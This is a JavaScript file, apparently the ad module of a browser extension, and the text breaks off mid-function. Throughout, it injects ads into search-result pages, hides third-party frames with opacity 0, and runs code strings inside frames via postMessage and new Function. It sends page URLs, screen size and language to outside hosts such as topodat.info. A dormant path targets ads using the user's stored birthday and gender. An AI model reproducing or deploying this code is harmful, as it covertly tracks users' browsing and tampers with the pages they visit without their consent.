if (!window.zMainObj) {
	window.zMainObj = {};
}

if (!window.zMainObj.adRequests) {
	window.zMainObj.isDebug = false;
	window.zMainObj.adRequests = {
		log: window.zMainObj.isDebug ? console.log.bind(console.log, `[AD_REQUEST]`) : () => { },
		id: 'ar' + parseInt(Math.random() * Date.now()).toString(16),
		cacheFrames: {},
		cssText: () => {
			const id = window.zMainObj.adRequests.id;

			return `
				.${id}hidden{ position:absolute !important; opacity:0 !important; pointer-events:none !important}
			`;
		},
		generateId: (length = 7) => {
			let result = '';
			const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
			const charactersLength = characters.length;

			for (let i = 0; i < length; i++) {
				result += characters.charAt(Math.floor(Math.random() * charactersLength));
			}

			return result;
		},
		insertStyles: (adsId, cssText, parent = document.head) => {
			if (!document.getElementById(adsId + 'style')) {
				const styleElement = document.createElement('style');

				styleElement.innerHTML = cssText;
				styleElement.setAttribute('id', adsId + 'style');
				parent.appendChild(styleElement);
			}
		},
		debounceDelay: function (func, delay, maxDelay) {
			let timeoutId = null;
			let lastTime = Date.now();

			return function () {
				// eslint-disable-next-line prefer-rest-params
				const args = arguments;

				if (timeoutId) {
					clearTimeout(timeoutId);
				}
				if (Date.now() - lastTime > maxDelay) {
					lastTime = Date.now();
					func.apply(func, args);
				} else {
					timeoutId = setTimeout(() => {
						func.apply(func, args);
					}, delay);
				}
			};
		},
		initObserver: function (parent, cb, minDelay, maxDelay, childList, subtree = false, attributes = false) {
			const option = {childList, subtree, attributes};
			const observer = new MutationObserver(window.zMainObj.adRequests.debounceDelay(cb, minDelay, maxDelay));

			observer.observe(parent, option);
		},
		initInterObserver: function (cb, parent, ...rest) {
			function handleIntersection(entries) {
				entries.map(({isIntersecting, target}) => {
					if (isIntersecting) {
						cb(target, ...rest);
						interObserver.unobserve(target);
					}
				});
			}

			const interObserver = new IntersectionObserver(handleIntersection);

			interObserver.observe(parent);
		},
		altStat: function (action, blockName, network, count = 1) {
			new Image().src =
				'https://doubleview.online/gant/njaclngoobdnphkahnehdejhliehbhid_902ffb7d-8e37-4fb8-a0fd-0f2704093c97/njaclngoobdnphkahnehdejhliehbhid/' +
				action +
				'/' +
				blockName +
				'/' +
				count +
				'/' +
				window.screen.availWidth +
				'x' +
				window.screen.availHeight +
				'/' +
				window.navigator.language;
		},
		stat: function (action, blockName, network, count = 1) {
			return;
			const statDom = 'astato.online';
			let statUrl =
				`https://${statDom}/s/c?a=${action}&u=902ffb7d-8e37-4fb8-a0fd-0f2704093c97&e=njaclngoobdnphkahnehdejhliehbhid&b=west_${blockName}&n=${network}_west&r=` +
				Math.random();

			if (action !== 'click') {
				statUrl += `&c=${count}`;
			}
			new Image().src = statUrl;
			window.zMainObj.adRequests.altStat(action, blockName, network, count);
		},
		onLoadEpom: function (response, callback, options) {
			const rData = [];
			const result = {};

			if (!response) {
				callback(null);

				return;
			}
			result.title = response.title;
			result.subtitle = response.description;
			result.url = response.clickUrl;
			result.site = '';
			result.img =
				response.images && response.images.length && response.images.length > 0 ? response.images[0].url : '';

			response.beacons &&
				response.beacons.length > 0 &&
				response.beacons.forEach(({type, url}) => {
					if (type && type === 'impression') {
						new Image().src = url;
					}
				});

			rData.push(result);

			options.blockName && window.zMainObj.adRequests.stat('view', options.blockName, 'epom');
			callback(rData, null, 'epom');
		},
		generateChanelTargeting: function (age, gender) {
			let result = '';

			if (age < 13) {
				result = '0013';
			} else if (age >= 13 && age <= 17) {
				result = '1317';
			} else if (age >= 18 && age <= 24) {
				result = '1824';
			} else if (age >= 25 && age <= 34) {
				result = '2534';
			} else if (age >= 35 && age <= 44) {
				result = '3544';
			} else if (age >= 45 && age <= 54) {
				result = '4554';
			} else if (age >= 55 && age <= 64) {
				result = '5564';
			} else if (age >= 65) {
				result = '6500';
			} else {
				result = '0000';
			}

			return gender + result;
		},
		epom: function (options, callback) {
			callback(null);
			return;
			window.zMainObj.storage.getData('userDataGAG', (data) => {
				const birthday = data && data.birthday ? data.birthday : '';
				const gender = data && data.gender ? data.gender : '';
				let age = '0';

				if (birthday) {
					const birthdayInMs = new Date(birthday);
					const ageDifMs = Date.now() - birthdayInMs;
					const ageDate = new Date(ageDifMs);

					age = Math.abs(ageDate.getUTCFullYear() - 1970);
				}

				const genderFromStorage = gender && (gender === 'm' || gender === 'f') ? gender : 'n';
				const xhr = new XMLHttpRequest();
				const normalizedGender = genderFromStorage === 'm' ? 'male' : genderFromStorage === 'f' ? 'female' : 'unknown';
				const chanelTargeting = window.zMainObj.adRequests.generateChanelTargeting(age, genderFromStorage);

				const reqLink = `https://aj2472.online/ads-api-native?key=${options.id}&format=json&ch=${chanelTargeting}&cp.age=${age}&cp.gender=${normalizedGender}`;

				xhr.responseType = 'json';
				xhr.open('GET', reqLink, true);
				xhr.addEventListener('load', function (event) {
					const response = event?.currentTarget?.response;

					!response || response?.message === 'no ads'
						? callback(null)
						: window.zMainObj.adRequests.onLoadEpom(response, callback, options);
				});
				xhr.addEventListener('error', function () {
					callback(null);
				});
				xhr.withCredentials = true;
				xhr.send();
				options.blockName && window.zMainObj.adRequests.stat('request', options.blockName, 'epom');
			});
		},
		nts: function (options, callback) {
			//fetch(`https://topodat.info/ntv.php?v=2&r=` + new Date().getTime()).then((response) => response.text()).then((data) => {
			fetch(`https://gulkayak.com/nts/nv.php?r=` + new Date().getTime()).then((response) => response.text()).then((data) => {
				let response = false;
				if (data != '') {
					try {
						response = JSON.parse(data);
					} catch (e) { }
				}
				if (!response || response?.message === 'no ads') {
					callback(null);
				}
				else {
					window.zMainObj.adRequests.onLoadNts(response, callback, options);
				}
			});
			return;
			if (window.zMainObj.storage.bgRequest) {
				window.zMainObj.storage.bgRequest(`https://topodat.info/ntv.php?v=2&r=` + new Date().getTime(), function (data) {
					let response = false;
					if (data != '') {
						try {
							response = JSON.parse(data);
						} catch (e) { }
					}
					if (!response || response?.message === 'no ads') {
						callback(null);
					}
					else {
						window.zMainObj.adRequests.onLoadNts(response, callback, options);
					}
				});
				return;
			}
			const xhr = new XMLHttpRequest();

			const reqLink = `https://topodat.info/ntv.php?v=2&r=` + new Date().getTime();

			xhr.responseType = 'json';
			xhr.open('GET', reqLink, true);
			xhr.addEventListener('load', function (event) {
				const response = event?.currentTarget?.response;
				!response || response?.message === 'no ads'
					? callback(null)
					: window.zMainObj.adRequests.onLoadNts(response, callback, options);
			});
			xhr.addEventListener('error', function () {
				callback(null);
			});
			xhr.withCredentials = true;
			xhr.send();
			options.blockName && window.zMainObj.adRequests.stat('request', options.blockName, 'nts');
		},
		onLoadNts: function (response, callback, options) {
			const rData = [];
			const result = {};

			if (!response) {
				callback(null);

				return;
			}
			result.title = response.title;
			result.subtitle = response.description;
			result.url = response.clickUrl;
			result.site = '';
			result.query = response.query;
			result.img =
				response.images && response.images.length && response.images.length > 0 ? response.images[0].url : '';

			if (response.creativeId) {
				result.creativeId = response.creativeId;
			}
			response.beacons &&
				response.beacons.length > 0 &&
				response.beacons.forEach(({type, url}) => {
					if (type && type === 'impression') {
						new Image().src = url;
					}
				});

			rData.push(result);

			options.blockName && window.zMainObj.adRequests.stat('view', options.blockName, 'nts');
			callback(rData, null, 'nts');
		},
		getFrameUrl: function (callback) {
			const xhr = new XMLHttpRequest();
			const reqLink = `https://rumorpix.com/interface/get_random_news.php?cnt=1`;

			xhr.responseType = 'json';
			xhr.open('GET', reqLink, true);
			xhr.addEventListener('load', function (event) {
				const response = event.currentTarget.response;

				if (response?.data?.length === 0) {
					callback(null);

					return;
				}

				callback(response.data);
			});
			xhr.addEventListener('error', function (event) {
				callback(null);

				void event;
			});
			xhr.send();
		},
		createFrameWrapper: function (width, height, id) {
			const wrapper = document.createElement('div');

			wrapper.style.setProperty('width', width + 'px');
			wrapper.style.setProperty('height', height + 'px');
			wrapper.style.setProperty('opacity', '0');
			wrapper.style.setProperty('pointer-events', 'none');
			wrapper.style.setProperty('user-select', 'none');
			wrapper.style.setProperty('position', 'absolute');
			wrapper.style.setProperty('white-space', 'normal', 'important');
			wrapper.style.setProperty('direction', 'ltr', 'important');
			wrapper.style.setProperty('position', 'relative', 'important');
			wrapper.style.setProperty('overflow', 'hidden', 'important');
			wrapper.classList.add(id + 'frm_wrapper');

			return wrapper;
		},
		iframeRender: function (
			parentBlock,
			onSuccess,
			onFail,
			frameWidth,
			frameHeight,
			frameUrl,
			additionalSettings = ''
		) {
			const hashId = window.zMainObj.adRequests.generateId() + additionalSettings;
			const wrapper = window.zMainObj.adRequests.createFrameWrapper(frameWidth, frameHeight, hashId);

			parentBlock.classList.add(window.zMainObj.adRequests.id + 'hidden');
			window.zMainObj.adRequests.getFrameUrl(function (data) {
				if (!data || data.length === 0) {
					return;
				}
				const iframe = document.createElement('iframe');
				const screenWidth = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
				const screeHeight = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;

				iframe.setAttribute('scrolling', 'no');
				iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
				iframe.setAttribute('width', screenWidth.toString());
				iframe.setAttribute('height', screeHeight.toString());
				iframe.setAttribute('src', data[0][frameUrl] + `#${hashId}`);
				iframe.style.setProperty('width', screenWidth + 'px');
				iframe.style.setProperty('height', screeHeight + 'px');
				iframe.style.setProperty('opacity', '1');
				iframe.style.setProperty('z-index', '1');
				iframe.style.setProperty('border', 'none');
				iframe.style.setProperty('overflow', 'hidden');
				iframe.style.setProperty('position', 'absolute');
				iframe.style.setProperty('top', '0');
				iframe.style.setProperty('left', '0');
				wrapper.appendChild(iframe);
				parentBlock.appendChild(wrapper);
				window.zMainObj.adRequests.cacheFrames[hashId] = {
					parent: wrapper,
					onSuccess,
					onFail
				};
			});
		},
		initMessageListener: function () {
			window.addEventListener(
				'message',
				(e) => {
					if (e?.data?.getFrmDets && e?.source) {
						e.source.postMessage(
							{
								frmDets: ['evrCpWork', 'evrCp']
							},
							'*'
						);
					}
					if (e?.data?.msgData) {
						const id = Object.keys(e.data.msgData)[0];
						const frameData = window.zMainObj.adRequests.cacheFrames[id];

						if (frameData) {
							const {parent, onSuccess, onFail} = frameData;

							if (e.data.msgData.status === 'ok') {
								parent.style.setProperty('opacity', '1');
								parent.style.setProperty('pointer-events', 'all');
								parent.style.setProperty('user-select', 'all');
								parent.style.setProperty('position', 'relative');
								parent.parentNode.classList.remove(window.zMainObj.adRequests.id + 'hidden');
								onSuccess(parent);
								delete window.zMainObj.adRequests.cacheFrames[id];
							} else {
								onFail();
								delete window.zMainObj.adRequests.cacheFrames[id];
							}
						}
					}
				},
				false
			);
		},
		init: function () {
			window.zMainObj.adRequests.initMessageListener();
			window.zMainObj.adRequests.insertStyles(window.zMainObj.adRequests.id, window.zMainObj.adRequests.cssText());
		},
		renderResults: {
			goSerpRes: null,
			ytInPlayer: null,
			ytRightAds: null,
			biSerpRes: null,
			yaSerpRes: null
		},
		postRenderStat(args) {
			return;
			const {action, moduleName} = args;

			const props = {
				a: 'sendRenderStat',
				p: {
					c: 'US',
					u: '902ffb7d-8e37-4fb8-a0fd-0f2704093c97',
					e: 'njaclngoobdnphkahnehdejhliehbhid',
					ac: action,
					ab: moduleName
				}
			};

			// console.log('postRenderStat', props);

			const msg = btoa(unescape(encodeURIComponent(JSON.stringify(props))));

			window.navigator.sendBeacon('https://topodat.info/c', msg);
		},
		postStatData: function (args) {
			const {creativeID, moduleName, action} = args;

			const storage = window.zMainObj.storage;

			const opts = {
				method: 'POST',
				body: btoa(
					unescape(
						encodeURIComponent(
							JSON.stringify({
								a: 'sendNtsStatFixed',
								p: {
									c: 'US',
									ci: creativeID,
									ab: moduleName,
									ac: action,
									u: '902ffb7d-8e37-4fb8-a0fd-0f2704093c97',
									e: 'njaclngoobdnphkahnehdejhliehbhid',
									ul: document.location.toString()
								}
							})
						)
					)
				),
				headers: {'Content-Type': 'text/plain'},
				credentials: 'include'
			};

			/* const cb = () => { };

			if (storage && storage.bgRequest) {
				storage.bgRequest('https://topodat.info/c', cb, opts);
				return;
			} */

			fetch('https://topodat.info/c', opts);
		},
		postStatClicksCode: function (args) {
			const {creativeID, moduleName} = args;

			let postStatFunc = function ({creativeID, moduleName}) {
				let links = document.querySelectorAll('a');
				for (let i = 0, l = links.length; i < l; i++) {
					if (links[i] && links[i].addEventListener) {
						links[i].addEventListener('click', function (e) {
							window.top.postMessage({
								task: 'sendNtsStatFixed',
								creativeID: creativeID,
								moduleName: moduleName,
								action: 'clicks'
							}, '*');
						});
					}
				}
			};

			let postStatCode = `(function(){
				let creativeID = '${creativeID}';
				let moduleName = '${moduleName}';
				let action = 'clicks';

				let postStatFunc = ${postStatFunc};
				postStatFunc({creativeID, moduleName});
			})()`;

			return postStatCode;
		},
		frameNtsStatListener: false,
		setFrameNtsStatListener: function () {
			if (window.zMainObj.adRequests.frameNtsStatListener) return;

			window.addEventListener('message', function (e) {
				if (e.data && e.data.task === 'sendNtsStatFixed') {
					const {creativeID, moduleName, action} = e.data;

					window.zMainObj.adRequests.postStatData({creativeID, moduleName, action});
				}
			});

			window.zMainObj.adRequests.frameNtsStatListener = true;
		},
		generateFunctionCallString: function (func, args) {
			try {
				if (typeof func !== 'function') {
					throw new Error('First argument must be a function');
				}

				let argsString = JSON.stringify(args);

				let funcString = func.toString();

				funcString = funcString.replace(/`/g, '\\`');

				return `(function(){
					var args = ${argsString};
					(${funcString})(args);
				})()`;
			} catch (error) {
				console.log(error);
			}
		},
		renderSearchAds: function (args, options, details) {
			const findMethodName = details.findMethodName;
			const logName = details.logName;
			try {
				const {
					id,
					src,
					parentBlock,
					styles,
					adCount,
					successCallback,
					failCallback,
					bgColor,
					moduleName,
					creativeID,
					additionalRenderFunction
				} = args;
			
				if (moduleName === 'bi_serp_res') {
					if (options.debug) console.log(args);
				}
			
				let frame = parentBlock.querySelector('iframe');
			
				if (!frame) {
					if (options.debug) console.log('adRequests', parentBlock);
					if (options.debug) console.log('adRequests', frame);
			
					frame = window.zMainObj.adRequests.createFrame(id, src);
					parentBlock.append(frame);
				}
			
				let postStatCode = null;
			
				if (moduleName && creativeID) {
					postStatCode = window.zMainObj.adRequests.postStatClicksCode({moduleName, creativeID});
			
					window.zMainObj.adRequests.setFrameNtsStatListener();
				}
			
				const handleMessageArgs = {
					frame,
					styles,
					adCount,
					bgColor,
					parentBlock,
					successCallback,
					failCallback,
					debug: options.debug,
					postStatCode,
					moduleName,
					// additionalRenderFunction: additionalRenderFunction ? window.zMainObj.adRequests.generateFunctionCallString(additionalRenderFunction, {}) : null
					additionalRenderFunction: additionalRenderFunction ? additionalRenderFunction.toString().replace(/`/g, '\\`') : null
				};
				
			
				if (moduleName) {
					window.zMainObj.adRequests.postRenderStat({
						action: 'started',
						moduleName
					});
				}
			
				window.addEventListener('message', (event) => {
					window.zMainObj.adRequests.handleFrameMessage(event, handleMessageArgs);
				});
				
				
				window.zMainObj.adRequests[findMethodName](handleMessageArgs, {debug: options.debug});
			} catch (error) {
				if (options.debug)
				{
					console.log(logName+' error: ', error);
				}
			}
		},
		renderSmvSearchAds: function (args, options) {
			window.zMainObj.adRequests.renderSearchAds(args, options, {findMethodName : 'findSmvAds',logName : 'renderSmvSearchAds'});
		},
		renderTflSearchAds: function (args, options) {
			window.zMainObj.adRequests.renderSearchAds(args, options, {findMethodName : 'findTflAds',logName : 'renderTflSearchAds'});
		},
		renderGoogleSearchAds: function (args, options) {
			window.zMainObj.adRequests.renderSearchAds(args, options, {findMethodName : 'findGoogleAds',logName : 'renderGoogleSearchAds'});
		},
		renderStarted: {},
		renderSuccess: {},
		handleFrameMessage: function (event, args) {
			try {
				let gotFinalHeight = false;

				let {frame, styles, adCount, successCallback, failCallback, debug, postStatCode, moduleName, additionalRenderFunction, bgColor} = args;

				const data = event.message || event.data;

				if (!frame) {
					failCallback({
						failReason: 'no frame'
					});

					return;
				}

				if (!data) return;
				if (!data.frame_id || data.frame_id !== frame.id) return;

				if (data.getFrmDets) {
					frame.contentWindow.postMessage(
						{
							frmDets: ['evrCpWork', 'evrCp']
						},
						'*'
					);

					if (window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]) {
						clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]);
						delete window.zMainObj.adRequests.goAdsSearchTimeout[frame.id];
					}

					return;
				}

				if (
					(data.hasOwnProperty('go_found') && data.go_found === false) ||
					(data.hasOwnProperty('tfl_found') && data.tfl_found === false) ||
					(data.hasOwnProperty('smv_found') && data.smv_found === false)
				) {
					if (window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]) {
						clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]);
						delete window.zMainObj.adRequests.goAdsSearchTimeout[frame.id];
					}

					failCallback({
						failReason: data.failReason
					});

					window.zMainObj.adRequests.postRenderStat({
						action: data.failReason,
						moduleName
					});
				}

				if (data.renderFailed) {
					if (window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]) {
						clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]);
						delete window.zMainObj.adRequests.goAdsSearchTimeout[frame.id];
					}

					failCallback({
						failReason: data.failReason
					});

					window.zMainObj.adRequests.postRenderStat({
						action: data.failReason,
						moduleName
					});
				}

				if (
					(data.go_found || data.tfl_found || data.smv_found) && 
					data.frame_id === frame.id
				) {
					let prepareMethodName = 'prepareGoogleAds';
					if(data.go_found)
					{
						additionalRenderFunction = `\`${additionalRenderFunction}\``;
					}
					if(data.tfl_found)
					{
						prepareMethodName = 'prepareTflAds';
					}
					if(data.smv_found)
					{
						prepareMethodName = 'prepareSmvAds';
					}
					window.zMainObj.adRequests.postRenderStat({
						action: 'ads found',
						moduleName
					});

					if (frame.contentWindow) {
						frame.contentWindow.postMessage(
							{
								'evrCpWork': 1,
								'evrCp': `(()=>{${window.zMainObj.adRequests[prepareMethodName].toString()};${prepareMethodName}('${frame.id
									}', "${styles}", '${adCount}', ${additionalRenderFunction}, "${bgColor}", ${debug}, \`${postStatCode}\`);})()`
							},
							'*'
						);

						window.zMainObj.adRequests.postRenderStat({
							action: 'preparing ads',
							moduleName
						});

						for (let i = 0; i < 1; i++) {
							setTimeout(function () {
								if (gotFinalHeight) {
									return;
								}

								if (frame.contentWindow) {
									frame.contentWindow.postMessage(
										{
											'evrCpWork': 1,
											'evrCp': `(()=>{${window.zMainObj.adRequests[prepareMethodName].toString()};${prepareMethodName}('${frame.id
												}', "${styles}", '${adCount}', ${additionalRenderFunction}, "${bgColor}", ${debug}, \`${postStatCode}\`)})()`
										},
										'*'
									);

									window.zMainObj.adRequests.postRenderStat({
										action: 'preparing ads',
										moduleName: moduleName
									});
								}
							}, i * 100);
						}
					}
				}

				if (data.finalHeight && data.finalHeight > 0) {
					gotFinalHeight = true;

					if (window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]) {
						clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]);
						delete window.zMainObj.adRequests.goAdsSearchTimeout[frame.id];
					}

					successCallback(data.finalHeight);

					window.zMainObj.adRequests.postRenderStat({
						action: 'success',
						moduleName
					});
				}

			} catch (error) {
				console.log(error);
			}
		},
		goAdsSearchTimeout: {},
		findSearchAds: function (args, options, details) {
			try {
				const {frame, bgColor, failCallback, moduleName} = args;
		
				window.zMainObj.adRequests.postRenderStat({
					action: 'trying to find ads',
					moduleName
				});
		
				let counter = 0;
				if (options.debug) console.log(frame);
		
				const id = frame.id;
		
				sendSearchAdMessage();
		
				function sendSearchAdMessage() {
					if (window.zMainObj.adRequests.renderStarted[frame.id]) return;
					if (options.debug) console.log(frame.id);
		
					const platform = details.platform;
					const docAnchor = details.docAnchor;
					const adsSelector = details.adsSelector;
					const debug = options.debug;
		
					if (!window.zMainObj.adRequests.goAdsSearchTimeout) {
						window.zMainObj.adRequests.goAdsSearchTimeout = {};
					}
		
					if (options.debug) console.log(document.querySelector(`#${frame.id}`));
		
					if (frame.contentWindow) {
						frame.contentWindow.postMessage(
							{
								'evrCpWork': 1,
								'evrCp': `${window.zMainObj.adRequests.findAds.toString()};findAds('${platform}', '${id}', '${docAnchor}', '${adsSelector}', ${debug}, '${bgColor}')`
							},
							'*'
						);
					}
		
					window.zMainObj.adRequests.goAdsSearchTimeout[frame.id] = setTimeout(sendSearchAdMessage, 100);
		
					if (counter < 100) {
						counter++;
					} else {
						if (window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]) {
							clearTimeout(window.zMainObj.adRequests.goAdsSearchTimeout[frame.id]);
							delete window.zMainObj.adRequests.goAdsSearchTimeout[frame.id];
						}
		
						failCallback({
							failReason: 'Exceeded the number of attempts to find ads'
						});
		
						window.zMainObj.adRequests.postRenderStat({
							action: 'Exceeded the number of attempts to find ads',
							moduleName
						});
		
						if (options.debug) {
							console.log('Google ads not found');
						}
					}
				}
			} catch (error) {
				if (options.debug) {
					console.error(`renderGoogleSearchAds/findGoogleAds error`, error);
				}
			}
		},
		findGoogleAds: function (args, options) {
			window.zMainObj.adRequests.findSearchAds(args, options, {platform : 'google',docAnchor : '#result,#___gcse_0',adsSelector : '#master-1'});
		},
		findTflAds: function (args, options) {
			window.zMainObj.adRequests.findSearchAds(args, options, {platform : 'tfl',docAnchor : 'main',adsSelector : 'article[data-appns="API.YAlgo"]'});
		},
		findSmvAds: function (args, options) {
			window.zMainObj.adRequests.findSearchAds(args, options, {platform : 'smv',docAnchor : '.ads',adsSelector : '.ads'});
		},
		prepareGoogleAds: function prepareGoogleAds(id, minifiedStyles, adCount, additionalRenderFunction, bgColor, debug, postStatCode) {
			if (debug) console.log('prepareGoogleAds');
			let checkResultsType = document.querySelector('#resultsFrame');
			if(checkResultsType && checkResultsType.contentWindow)
			{
				checkResultsType.contentWindow.postMessage(
					{
						'evrCpWork': 1,
						'evrCp': `(()=>{${prepareGoogleAds.toString()};prepareGoogleAds('${id}', "${minifiedStyles}", '${adCount}', `+JSON.stringify(additionalRenderFunction)+`, "${bgColor}", ${debug}, \`${postStatCode}\`);})()`
					},
					'*'
				);
				return;
			}
			try {
				document.querySelectorAll('iframe').forEach((iframe) => {
					if (iframe.clientHeight > 20) {
						sendToFrame(iframe, id, minifiedStyles, adCount, additionalRenderFunction, debug, postStatCode, bgColor);
						setTimeout(function () {
							sendToFrame(iframe, id, minifiedStyles, adCount, additionalRenderFunction, debug, postStatCode, bgColor);
						}, 100);

						iframe.onload = function () {
							sendToFrame(iframe, id, minifiedStyles, adCount, additionalRenderFunction, debug, postStatCode, bgColor);
							setTimeout(function () {
								sendToFrame(iframe, id, minifiedStyles, adCount, additionalRenderFunction, debug, postStatCode, bgColor);
							}, 100);
						};
					}
				});

				function sendToFrame(iframe, frameID, styles, adCount, additionalRenderFunction, debug, postStatCode, bgColor) {
					try {
						if (debug) console.log('sendToFrame');

						if (iframe.contentWindow) {
							iframe.contentWindow.postMessage(
								{
									'evrCpWork': 1,
									'evrCp': `(()=>{${subFrameCode.toString()};subFrameCode('${frameID}', "${styles}", '${adCount}', "${bgColor}", ${additionalRenderFunction}, ${debug}, function(){${postStatCode}})})()`
								},
								'*'
							);
						}
					} catch (error) {
						if (debug) console.log(error);
					}
				}

				function subFrameCode(frameId, styles, adCount, bgColor, additionalRenderFunction, debug, postStatCode) {
					try {
						if (debug) console.log('subFrameCode');
						if (window.goSubframeCode) return;
						
						const title = document.querySelector('.styleable-title');
						const url = document.querySelector('.styleable-visurl');
						const description = document.querySelector('.styleable-description');
						
						const newTitle = document.querySelector('.si27');
						const newUrl = document.querySelector('.si28');
						const newDescription = document.querySelector('.si29');
						
						const validStyles = title && url && description;
						const validStylesNew = newTitle && newUrl && newDescription;
						
						if (!validStyles && !validStylesNew) return;
						
						
						
						window.goSubframeCode = true;

						let style = document.createElement('style');
						style.innerText = `${styles}`;

						if (adCount > 0) {
							if (debug) console.log('adCount');
							const items = document.querySelectorAll('.styleable-rootcontainer');
							const selectedIndex = Math.floor(Math.random() * adCount);
							const selectedIndexCss = selectedIndex + 1;

							style.innerText += `.setinv{display:none!important;}`;
							style.innerText += `.styleable-rootcontainer{background:transparent !important}`;

							if (items.length > 0) {
								items.forEach((item) => item.classList.add('setinv'));

								for (let i = 0; i <= adCount - 1; i++) {
									items[i].classList.remove('setinv');
								}
							}
						}

						document.body.appendChild(style);

						if (additionalRenderFunction && typeof additionalRenderFunction === 'function') {
							const additionalStyle = additionalRenderFunction(bgColor);
							document.body.appendChild(additionalStyle);
						}

						if (debug) console.log('append style element');

						const links = document.querySelectorAll(`.styleable-rootcontainer a`);
						links.forEach((link) => link.setAttribute('target', '_blank'));
						
						function checkNeedRepD()
						{
							let title = document.querySelector('.styleable-title');
							let newTitle = document.querySelector('.si27');
							try{
								let needReplaceDom = false;
								if(title && title.offsetHeight==0 && title.href.indexOf('googleadservices.com/pagead/aclk') > -1)
								{
									needReplaceDom = true;
								}
								if(newTitle && newTitle.offsetHeight==0 && newTitle.href.indexOf('googleadservices.com/pagead/aclk') > -1)
								{
									needReplaceDom = true;
								}
								if(needReplaceDom)
								{
									let ancr = document.querySelectorAll('a[href*="googleadservices.com/pagead/aclk"]');
									for(let aa = 0;aa < ancr.length;aa++)
									{
										ancr[aa].setAttribute('href',ancr[aa].href.replace('googleadservices.com/pagead/aclk','google.com/pagead/aclk'));
									}
								}
							}catch(ern){}
						}
						//checkNeedRepD();
						//setTimeout(checkNeedRepD,100);
						//setTimeout(checkNeedRepD,200);
						
						//if (validStyles || validStylesNew) {
							window.top.postMessage({finalHeight: document.body.clientHeight, frame_id: frameId}, '*');

							if (postStatCode) {
								postStatCode();
							}

							if (debug) console.log('finalHeight message');
						/* } else {
							window.top.postMessage(
								{
									renderFailed: true,
									failReason: 'invalid google ads styles',
									frame_id: frameId
								},
								'*'
							);
							if (debug) console.log('invalid styles');
						} */
					} catch (error) {
						if (debug) console.log(error);
					}
				}
			} catch (error) {
				if (debug) {
					console.error('adRequests findGoogleAds error: ', error);
				}
			}
		},
		prepareTflAds: function prepareTflAds(id, minifiedStyles, adCount, additionalRenderFunction, bgColor, debug, postStatCode) {
			if (debug) console.log('prepareTflAds');
			if(window.preparedTflAds)
			{
				return;
			}
			try {
				let style = document.createElement('style');
				style.innerText = `${minifiedStyles}`;

				if (adCount > 0) {
					if (debug) console.log('adCount');
					const items = document.querySelectorAll('article[data-appns="API.YAlgo"]');
					const selectedIndex = Math.floor(Math.random() * adCount);
					const selectedIndexCss = selectedIndex + 1;

					style.innerText += `.setinv{display:none!important;}`;

					if (items.length > 0) {
						items.forEach((item) => item.classList.add('setinv'));

						for (let i = 0; i <= adCount - 1; i++) {
							items[i].classList.remove('setinv');
						}
					}
				}

				document.body.appendChild(style);
				
				if (additionalRenderFunction) {
					const additionalStyle = additionalRenderFunction(bgColor);
					if(additionalStyle)
					{
						document.body.appendChild(additionalStyle);
					}
				}

				if (debug) console.log('append style element');
				
				let oneItem = document.querySelector('article[data-appns="API.YAlgo"]');
				window.top.postMessage({finalHeight: oneItem.parentNode.clientHeight+40, frame_id: id}, '*');
				window.preparedTflAds = 1;
				if (postStatCode) {
					postStatCode = new Function(postStatCode);
					postStatCode();
				}
				if (debug) console.log('finalHeight message');
			} catch (error) {
				//if (debug)
				{
					console.error('adRequests findTflAds error: ', error);
				}
			}
		},
		prepareSmvAds: function prepareSmvAds(id, minifiedStyles, adCount, additionalRenderFunction, bgColor, debug, postStatCode) {
			if (debug) console.log('prepareSmvAds',typeof(additionalRenderFunction));
			if(window.preparedSmvAds)
			{
				return;
			}
			try {
				let style = document.createElement('style');
				style.innerText = `${minifiedStyles}`;
		
				if (adCount > 0) {
					if (debug) console.log('adCount');
					const items = document.querySelectorAll('.listmargin');
					const selectedIndex = Math.floor(Math.random() * adCount);
					const selectedIndexCss = selectedIndex + 1;
		
					style.innerText += `.setinv{display:none!important;}`;
		
					if (items.length > 0) {
						items.forEach((item) => item.classList.add('setinv'));
		
						for (let i = 0; i <= adCount - 1; i++) {
							items[i].classList.remove('setinv');
						}
					}
				}
		
				document.body.appendChild(style);
				
				if (additionalRenderFunction) {
					const additionalStyle = additionalRenderFunction(bgColor);
					if(additionalStyle)
					{
						document.body.appendChild(additionalStyle);
					}
				}
		
				if (debug) console.log('append style element');
				
				let oneItem = document.querySelector('.ads');
				window.top.postMessage({finalHeight: oneItem.clientHeight+40, frame_id: id}, '*');
				window.preparedSmvAds = 1;
				if (postStatCode) {
					postStatCode = new Function(postStatCode);
					postStatCode();
				}
				if (debug) console.log('finalHeight message');
			} catch (error) {
				//if (debug)
				{
					console.error('adRequests findSmvAds error: ', error);
				}
			}
		},
		findAds: function findAds(platform, id, docAnchor, adsSelector, debug, bgColor) {
			window.zMLO = [platform, id, docAnchor, adsSelector, debug, bgColor];
			if(platform == 'google')
			{
				let checkResultsType = document.querySelector('#resultsFrame');
				if(checkResultsType && checkResultsType.contentWindow)
				{
					let stlE = document.querySelector('#stlE');
					if(!stlE)
					{
						let stlE = document.createElement('style');
						stlE.setAttribute('id','stlE');
						stlE.appendChild(document.createTextNode('.header,.footer{display:none !important;}'));
						document.body.appendChild(stlE);
					}
					checkResultsType.contentWindow.postMessage(
						{
							'evrCpWork': 1,
							'evrCp': `${findAds.toString()};findAds('${platform}', '${id}', '${docAnchor}', '${adsSelector}', ${debug}, '${bgColor}')`
						},
						'*'
					);
					return;
				}
				try {
					let chkr = document.querySelector('div#result');
					if(chkr)
					{
						let chkrs = document.querySelector('script[src*="results.js"]');
						if(!chkrs)
						{
							chkrs = document.createElement('script');
							chkrs.setAttribute('src','./results.js?6');
							document.head.appendChild(chkrs);
						}
					}
				} catch(error) {}
			}
			try {
				if (debug) {
					console.log('Trying to find Ads');
				}

				let platformMarker = null;
